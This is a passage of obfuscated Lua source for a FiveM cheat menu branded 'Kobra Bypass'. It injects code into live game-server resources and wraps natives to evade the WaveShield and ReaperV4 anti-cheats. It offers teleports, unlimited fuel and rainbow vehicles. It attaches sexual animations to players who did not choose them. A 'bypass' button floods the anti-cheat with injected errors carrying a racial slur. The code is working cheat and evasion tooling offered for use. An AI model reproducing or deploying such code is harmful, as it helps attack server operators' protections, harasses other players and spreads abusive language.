                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]]);end break;end end else local v897=0;while true do if (v897==(0 -0)) then v12:Notify("error","Kobra","Rainbow Vehicle Off",3769 -769 );if (GetResourceState("WaveShield")=="started") then print("swave");v48(v480,[[
                                            if not _G.osintRainbow then
                                                _G.osintRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.osintRainbow.enabled = false

                                            for name, orig in pairs(_G.osintRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.osintRainbow.thread and coroutine.status(_G.osintRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.osintRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]]);else v48(v480,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]]);end break;end end end break;end end end},{type="checkbox",label="Unlimited Fuel",checked=false,onSelect=function(v481) if v481 then local v618=0 + 0 ;while true do if (v618==(0 + 0)) then v12:Notify("success","Kobra","Unlimited Fuel On",3000);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                BlNkJmLzXcVb = true

                                local function LqWyXpR3tV()
                                    local TmPlKoMiJnBg = CreateThread
                                    local ZxCvBnMaSdFg = PlayerPedId
                                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                                    local VcXzQwErTyUi = GetVehiclePedIsIn
                                    local KpLoMkNjBhGt = DoesEntityExist
                                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                                    TmPlKoMiJnBg(function()
                                        while BlNkJmLzXcVb and not Unloaded do
                                            local ped = ZxCvBnMaSdFg()
                                            if YhUjIkOlPlMn(ped, false) then
                                                local veh = VcXzQwErTyUi(ped, false)
                                                if KpLoMkNjBhGt(veh) then
                                                    JkLzXcVbNmAs(veh, 100.0)
                                                end
                                            end
                                            Wait(100)
                                        end
                                    end)
                                end

                                LqWyXpR3tV()
                                ]]);break;end end else local v619=462 -(428 + 34) ;while true do if (v619==0) then v12:Notify("error","Kobra","Unlimited Fuel Off",694 + 2306 );v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                BlNkJmLzXcVb = false
                                ]]);break;end end end end}}}}},{icon="",label="Emotes",type="subMenu",categories={{label="Emote Menu",tabs={{type="button",label="Detach All Entitys",onSelect=function() local v482=918 -(223 + 695) ;while true do if (0==v482) then print("dih");MachoInjectResourceRaw("any",[[
                            local function zXqLJWt7pN()
                                local xPvA71LtqzW = ClearPedTasks
                                local bXcT2mpqR9f = DetachEntity

                                xPvA71LtqzW(PlayerPedId())
                                bXcT2mpqR9f(PlayerPedId())
                            end

                            zXqLJWt7pN()
                            ]]);break;end end end},{type="divider",label="Emotes"},{type="button",label="Twerk On Them",onSelect=function() local v483={};for v574,v575 in pairs(v27) do if v575 then v483[ #v483 + 1 ]=v574;end end if ( #v483==(511 -(329 + 182))) then v281:Notify("error","Kobra","You must select a player first!",496 + 2504 );return;end for v576,v577 in ipairs(v483) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[twerk] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[twerk] Target ped invalid.")
                                                return
                                            end

                                            -- Safety: prevent attaching twice or to yourself
                                            if targetPed == playerPed then
                                                print("[twerk] Cannot twerk on yourself.")
                                                return
                                            end

                                            if StarkDaddy then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                StarkDaddy = false
                                                print("[twerk] Stopped twerking.")
                                                return
                                            end

                                            StarkDaddy = true
                                            local dict = "switch@trevor@mocks_lapdance"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[twerk] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Safety checks before attaching
                                            if not DoesEntityExist(targetPed) or not DoesEntityExist(playerPed) then
                                                print("[twerk] One of the peds no longer exists.")
                                                return
                                            end

                                            -- Attach safely
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "001443_01_trvs_28_idle_stripper", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[twerk] Started twerking on target.")

                                            -- Watchdog to auto detach if target dies/disconnects
                                            while StarkDaddy do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    StarkDaddy = false
                                                    print("[twerk] Target disappeared — detached safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v577,v577));end v281:Notify("success","Kobra","Attempted to twerk on "   ..  #v483   .. " player(s)." ,6846 -2846 );end},{type="divider",label="Vehicle Emotes"},{type="button",label="Blow Driver",onSelect=function() local v484={};for v578,v579 in pairs(v27) do if v579 then v484[ #v484 + 1 + 0 ]=v578;end end if ( #v484==(0 + 0)) then local v620=0;while true do if (v620==(0 -0)) then v281:Notify("error","Kobra","You must select a player first!",4062 -1062 );return;end end end for v580,v581 in ipairs(v484) do MachoInjectResourceRaw("any",string.format([[
                                        CreateThread(function()
                                            local playerPed = PlayerPedId()
                                            local player = GetPlayerFromServerId(%d)
                                            if player == -1 then
                                                print("[blowdriver] Target player not found for serverId %d")
                                                return
                                            end

                                            local targetPed = GetPlayerPed(player)
                                            if not targetPed or targetPed == 0 or not DoesEntityExist(targetPed) then
                                                print("[blowdriver] Target ped invalid.")
                                                return
                                            end

                                            -- Prevent doing animation on yourself
                                            if targetPed == playerPed then
                                                print("[blowdriver] Cannot perform on yourself.")
                                                return
                                            end

                                            if BlowDriver then
                                                ClearPedSecondaryTask(playerPed)
                                                DetachEntity(playerPed, true, false)
                                                BlowDriver = false
                                                print("[blowdriver] Stopped animation.")
                                                return
                                            end

                                            BlowDriver = true
                                            local dict = "mini@prostitutes@sexnorm_veh"
                                            RequestAnimDict(dict)
                                            local timeout = 0
                                            while not HasAnimDictLoaded(dict) and timeout < 100 do
                                                Wait(50)
                                                timeout = timeout + 1
                                            end

                                            if not HasAnimDictLoaded(dict) then
                                                print("[blowdriver] Failed to load animation dictionary.")
                                                return
                                            end

                                            -- Attach to driver seat roughly where needed
                                            AttachEntityToEntity(playerPed, targetPed, 11816, 0.25, 0.25, 0.0, 0.0, 0.0, 90.0, false, false, false, false, 2, true)
                                            TaskPlayAnim(playerPed, dict, "bj_loop_prostitute", 8.0, -8.0, -1, 33, 0, false, false, false)
                                            print("[blowdriver] Started animation on target.")

                                            -- Watchdog to auto stop if target disappears or dies
                                            while BlowDriver do
                                                Wait(1000)
                                                if not DoesEntityExist(targetPed) or IsEntityDead(targetPed) then
                                                    ClearPedSecondaryTask(playerPed)
                                                    DetachEntity(playerPed, true, false)
                                                    BlowDriver = false
                                                    print("[blowdriver] Target disappeared — stopped safely.")
                                                    break
                                                end
                                            end
                                        end)
                                    ]],v581,v581));end v281:Notify("success","Kobra","Attempted BlowDriver on "   ..  #v484   .. " player(s)." ,4000);end}}}}},{icon="",label="Teleports",type="subMenu",categories={{label="Teleport Menu",tabs={{type="button",label="FIB Building",onSelect=function() local v485=0;local v486;local v487;while true do if (v485==(0 -0)) then v486=GetResourceState("WaveShield")=="started" ;v487=GetResourceState("ReaperV4")=="started" ;v485=1;end if (v485==(1 + 0)) then if v486 then MachoInjectResourceRaw("WaveShield",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);elseif v487 then MachoInjectThread(0 -0 ,"any","",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function HAZ6YqLRbM()
                                    local aSdFgHjKlQwErTy = PlayerPedId
                                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                    local x, y, z = 140.43, -750.52, 258.15
                                    local ped = aSdFgHjKlQwErTy()
                                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                                end

                                HAZ6YqLRbM()
                            ]]);end break;end end end},{type="button",label="Mission Row PD",onSelect=function() local v488=0;local v489;local v490;while true do if (v488==(338 -(8 + 329))) then if v489 then MachoInjectResourceRaw("WaveShield",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);elseif v490 then MachoInjectThread(125 -(19 + 106) ,"any","",[[
                        local function oypB9FcNwK()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 425.1, -979.5, 30.7
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        oypB9FcNwK()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function oypB9FcNwK()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 425.1, -979.5, 30.7
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            oypB9FcNwK()
                            ]]);end break;end if ((0 -0)==v488) then v489=GetResourceState("WaveShield")=="started" ;v490=GetResourceState("ReaperV4")=="started" ;v488=1;end end end},{type="button",label="Pillbox Hospital",onSelect=function() local v491=GetResourceState("WaveShield")=="started" ;local v492=GetResourceState("ReaperV4")=="started" ;if v491 then MachoInjectResourceRaw("WaveShield",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);elseif v492 then MachoInjectThread(0,"any","",[[
                        local function TmXU0zLa4e()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 308.6, -595.3, 43.28
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        TmXU0zLa4e()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function TmXU0zLa4e()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 308.6, -595.3, 43.28
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            TmXU0zLa4e()
                            ]]);end end},{type="button",label="Grove Street",onSelect=function() local v493=0 -0 ;local v494;local v495;while true do if (v493==(2 -1)) then if v494 then MachoInjectResourceRaw("WaveShield",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);elseif v495 then MachoInjectThread(0 -0 ,"any","",[[
                        local function YrAFvPMkqt()
                            local aSdFgHjKlQwErTy = PlayerPedId
                            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                            local x, y, z = 109.63, -1943.14, 20.80
                            local ped = aSdFgHjKlQwErTy()
                            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                        end

                        YrAFvPMkqt()
                        ]]);else MachoInjectResourceRaw("any",[[
                            local function YrAFvPMkqt()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 109.63, -1943.14, 20.80
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            YrAFvPMkqt()
                            ]]);end break;end if (v493==(0 -0)) then v494=GetResourceState("WaveShield")=="started" ;v495=GetResourceState("ReaperV4")=="started" ;v493=1 + 0 ;end end end},{type="button",label="Legion Square",onSelect=function() local v496=0 -0 ;local v497;local v498;while true do if (v496==(0 + 0)) then v497=GetResourceState("WaveShield")=="started" ;v498=GetResourceState("ReaperV4")=="started" ;v496=1 + 0 ;end if (v496==1) then if v497 then MachoInjectResourceRaw("WaveShield",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);elseif v498 then MachoInjectThread(0,"any","",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);else MachoInjectResourceRaw("any",[[
                            local function zdVCXL8rjp()
                                local aSdFgHjKlQwErTy = PlayerPedId
                                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                                local x, y, z = 229.21, -871.61, 30.49
                                local ped = aSdFgHjKlQwErTy()
                                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                            end

                            zdVCXL8rjp()
                            ]]);end break;end end end}}}}},{icon="",label="Settings",type="subMenu",categories={{label="Interface",tabs={{type="subMenu",label="Keybinds",subTabs={{icon="",type="button",label="Menu Key",onSelect=function() v59("Choose Menu Key","",function(v582) for v621,v622 in pairs(v44) do if (v622:lower()==v582:lower()) then local v815=703 -(227 + 476) ;while true do if ((1 -0)==v815) then v12:ShowUI();return;end if (v815==(0 -0)) then v23=v622;Wait(358 -108 );v815=1 -0 ;end end end end end,"keybind");end}}},{type="scrollable",label="Menu Positioning (X)",desc="This is the menu positioning based on the X-Axis.",value=955 -(166 + 788) ,values={"Left","Center","Right"},onSelect=function() print("Selected - Menu Positioning (X)");end},{type="scrollable",label="Menu Positioning (Y)",desc="This is the menu positioning based on the Y-Axis.",value=1,values={"Top","Middle","Bottom"},onSelect=function() print("Selected - Menu Positioning (Y)");end}}}}}};v17=v16;v18=nil;v19=2 -1 ;v15=1 + 0 ;end;local function v96(v282) for v499,v500 in ipairs(v16) do if (v500.label=="Server") then for v723,v724 in ipairs(v500.categories) do if (v724.label=="Triggers") then local v898=0;while true do if (0==v898) then v724.tabs[ #v724.tabs + 1 + 0 ]=v282;return;end end end end end end end v12.UpdateTabChecked=function(v283,v284,v285,v286) for v501,v502 in pairs(v284 or {} ) do if ((v502.label==v285) and ((v502.type=="checkbox") or (v502.type=="slider-checkbox") or v502.type:find("checkbox"))) then v502.checked=v286;elseif (v502.type=="subMenu") then local v816=0;while true do if (v816==(1292 -(1162 + 130))) then if v502.categories then for v1246,v1247 in pairs(v502.categories) do v283:UpdateTabChecked(v1247.tabs,v285,v286);end end if v502.subTabs then v283:UpdateTabChecked(v502.subTabs,v285,v286);end break;end end end end end;v12.ShowKeybindList=function(v287,v288) v287:SendMessage({action="displayBinds",visible=true,binds=v288});end;v12.HideKeybindList=function(v289) v289:SendMessage({action="displayBinds",visible=false});end;v12.GetNearbyPlayers=function(v290,v291,v292,v293) local v294=0 -0 ;local v295;local v296;local v297;while true do if ((3 + 0)==v294) then if ( #v295==(0 -0)) then v295={};end return v295;end if (v294==(936 -(889 + 47))) then v295={};v296=PlayerPedId();v294=1 + 0 ;end if (v294==(1266 -(1153 + 111))) then v297=GetActivePlayers();if v297 then for v899,v900 in ipairs(v297) do if (v293 or (v900~=PlayerId())) then local v1050=0 -0 ;local v1051;while true do if (v1050==0) then v1051=GetPlayerPed(v900);if (v1051 and DoesEntityExist(v1051) and IsEntityAPed(v1051) and  not IsEntityDead(v1051)) then local v1348=0;local v1349;while true do if (v1348==(0 + 0)) then v1349=GetEntityCoords(v1051);if v1349 then local v1606=0 + 0 ;local v1607;while true do if (v1606==0) then v1607= #(v291-v1349);if (v1607<=v292) then v295[ #v295 + 1 ]={name=GetPlayerName(v900),serverId=GetPlayerServerId(v900)};end break;end end end break;end end end break;end end end end else local v817=0 + 0 ;local v818;local v819;local v820;while true do if (v817==0) then v818,v819=FindFirstPed();v820=nil;v817=1 + 0 ;end if (v817==(1 + 0)) then repeat local v1134=0;while true do if (v1134==(0 -0)) then if (v819 and IsPedAPlayer(v819) and DoesEntityExist(v819)) then local v1408=0;local v1409;while true do if (v1408==0) then v1409=NetworkGetPlayerIndexFromPed(v819);if ((v1409~= -1) and (v293 or (v1409~=PlayerId()))) then local v1614=0;local v1615;while true do if (v1614==(0 + 0)) then v1615=GetEntityCoords(v819);if v1615 then local v1738= #(v291-v1615);if (v1738<=v292) then v295[ #v295 + (97 -(23 + 73)) ]={name=GetPlayerName(v1409),serverId=GetPlayerServerId(v1409)};end end break;end end end break;end end end v820,v819=FindNextPed(v818);break;end end until  not v820 EndFindPed(v818);break;end end end v294=3;end if (v294==(286 -(26 + 259))) then v292=v292 or (153 + 197) ;if ( not v296 or  not DoesEntityExist(v296) or  not IsPlayerPlaying(PlayerId())) then v295={};return v295;end v294=2;end end end;CreateThread(function() v12:Initialize();v12:BuildDefaultMenu();v12:UpdateElements(v17);Wait(1561 -561 );v12:Notify("success","Kobra","You have loaded Kobra Bypass, welcome!",10525 -7525 );Wait(2629 -(1094 + 535) );v12:Notify("info","Kobra","Hello Kobra Menu user, thanks for using Kobra Bypass!",3000);Wait(114 + 886 );v96({type="button",label="Bypass WaveShield [Risky]",onSelect=function() local v503=0;while true do if (v503==(1876 -(1554 + 322))) then if (GetResourceState("WaveShield")~="started") then v12:Notify("info","Kobra","WaveShield not detected.",4425 -(989 + 436) );return;end for v821=1,1180 -(816 + 362)  do MachoInjectResource2(3,"WaveShield",[[
                error('my nigga what happened :(')
            ]]);end v503=1 -0 ;end if (v503==(2 -1)) then v12:Notify("success","Kobra","WaveShield bypass attempted.",11060 -8060 );break;end end end});if ((GetResourceState("ox_lib")=="started") or (GetResourceState("lb-phone")=="started") or (GetResourceState("monitor")=="started") or (GetResourceState("core")=="started") or (GetResourceState("es_extended")=="started") or (GetResourceState("qb-core")=="started") or (GetResourceState("ox_lib")=="started")) then v96({type="button",label="DeFXAP Events",onSelect=function() local v624=0 -0 ;local v625;local v626;local v627;while true do if (v624==(2 -1)) then while  not v626 do Wait(439 -339 );end if ( not v625 or (v625=="")) then local v1052=0 + 0 ;while true do if (v1052==0) then MachoMenuNotification("Error","No resource name entered.");v12:ShowUI();v1052=1;end if (v1052==1) then return;end end end if (GetResourceState(v625)~="started") then local v1053=763 -(86 + 677) ;while true do if (1==v1053) then return;end if (v1053==(0 + 0)) then MachoMenuNotification("Error","Resource ^3"   .. v625   .. "^7 is not started or doesn’t exist." );v12:ShowUI();v1053=1;end end end v627=[[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
